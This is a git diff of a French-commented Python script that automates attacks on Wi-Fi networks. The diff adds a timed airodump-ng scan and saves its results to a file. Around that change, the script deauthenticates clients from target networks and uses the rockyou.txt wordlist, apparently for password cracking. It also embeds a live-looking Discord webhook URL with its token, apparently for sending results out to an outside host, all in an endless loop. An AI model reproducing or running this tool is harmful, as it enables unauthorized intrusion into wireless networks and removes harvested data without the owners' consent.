@@ -8,11 +8,21 @@ import time
 INTERFACE = "wlan1"
 ROCKYOU_TXT = "rockyou.txt"
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1295144722633068544/8Ul3DDQNNGJ3ljMSTLy24ddAaLqTbyHumRQmWaU0dwutVYbYG7U6x5Fi1cYQam5tYkba"
+SCAN_DURATION = 10  # Durée de scan en secondes
+OUTPUT_FILE = "wifi_networks.txt"
 
-def capture_wifi():
+def capture_wifi(duration):
     print("Capture des réseaux Wi-Fi...")
-    output = subprocess.check_output(["airodump-ng", INTERFACE]).decode()
-    return output
+    # Lancer airodump-ng en arrière-plan
+    process = subprocess.Popen(["airodump-ng", INTERFACE], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(duration)  # Attendre la durée de scan
+    process.terminate()  # Terminer le processus airodump-ng
+    return process.stdout.read().decode()
+
+def save_results_to_file(results):
+    with open(OUTPUT_FILE, "w") as file:
+        file.write(results)
+    print(f"Résultats enregistrés dans {OUTPUT_FILE}")
 
 def deauth_clients(bssid):
     print(f"Déauthentification des clients sur le réseau {bssid}...")
@@ -35,7 +45,8 @@ def send_results(results):
 def main():
     while True:
         try:
-            wifi_output = capture_wifi()
+            wifi_output = capture_wifi(SCAN_DURATION)
+            save_results_to_file(wifi_output)
             bssids = []
             ssids = []
             for line in wifi_output.splitlines():
